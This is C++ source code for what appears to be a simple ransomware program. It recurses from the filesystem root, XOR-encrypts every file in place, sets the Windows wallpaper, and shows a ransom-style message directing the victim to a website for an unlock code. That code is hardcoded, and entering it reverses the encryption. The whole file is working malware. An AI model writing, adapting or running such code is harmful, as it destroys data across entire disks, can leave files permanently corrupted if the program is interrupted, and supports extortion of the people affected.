#include <string>
#include <string.h>
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <filesystem>

#ifdef _WIN32
#include <Windows.h>
#endif

#define CODE "713705"

#define catch_ignored \
    catch (const std::exception &e) {}

namespace fs = std::filesystem;

void XOR(std::string &_Text, char _Key)
{
    for (char &c : _Text)
        c = c ^ _Key;
}

void CrFile(const fs::path _File, char _Key)
{
    std::string content;
    std::ifstream file(_File);

    if (file)
    {
        content.assign((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        XOR(content, _Key);

        std::ofstream out(_File);
        if (out)
        {
            out << content;
            out.close();
        }
    }
}

void ListFile(const fs::path _Location, char _Key)
{
    try
    {
        for (const auto &entry : fs::directory_iterator(_Location))
            if (entry.is_directory())
                ListFile(entry.path(), _Key);
            else
                CrFile(entry.path(), _Key);
    }
    catch_ignored;
}

int main()
{
    const char KEY = rand() % 100;
    std::cout << "Operations are in progress, do not turn off your computer.\n\n";

    ListFile(fs::current_path().root_directory(), KEY);

#ifdef _WIN32
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void *)"no", SPIF_UPDATEINIFILE);
#endif

    std::cout << "\033[0;31m";
    std::cout << "/!\\ All files have been ENCRYPTED:\n";
    std::cout << "If you close this application, your data will be lost...\n\n";
    std::cout << "If you want to find your data, search for the code on the site: https://antoinelandrieux.github.io/Ransomware\n";

    std::string code = "";

    while (code != CODE)
    {
        std::cout << "\nCODE: ";
        std::cin >> code;
    }

    ListFile(fs::current_path().root_directory(), KEY);

    std::cout << "\033[0;00m" << std::flush;
    return EXIT_SUCCESS;
}
